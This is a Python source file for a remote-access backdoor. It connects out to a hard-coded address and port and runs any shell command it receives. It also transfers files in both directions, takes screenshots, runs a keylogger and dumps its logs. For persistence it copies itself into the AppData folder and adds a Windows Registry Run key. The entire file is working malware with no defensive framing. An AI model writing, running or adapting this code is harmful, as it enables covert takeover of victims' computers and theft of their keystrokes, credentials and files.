import json
import socket
import subprocess
import os
import threading
import time
import pyautogui
import keylogger
import shutil
import sys

def send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    soc.send(f.read())

def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')

def download_file(file_name):
    f = open(file_name, 'wb')
    soc.settimeout(1)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break
    soc.settimeout(None)
    f.close()

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v' + reg_name + ' /t REG_SZ /d "'+ file_location +'"', shell=True)
            send('created persistence with reg key: '+ reg_name)
        else:
            send('persistence already exists')
    except:
        send('error creating persistence with the target machine')
def connect():
    while True:
        time.sleep(20)
        try:
            soc.connect(('192.168.1.4',3000))
            shell()
            soc.close()
            break
        except:
            connect()

def shell():
    while True:
        command = recieve()
        if command=='quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t= threading.Thread(target=keylog.start)
            t.start()
            send('keylogger has been started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_file()
            send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            send('keylogger has been terminated')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()


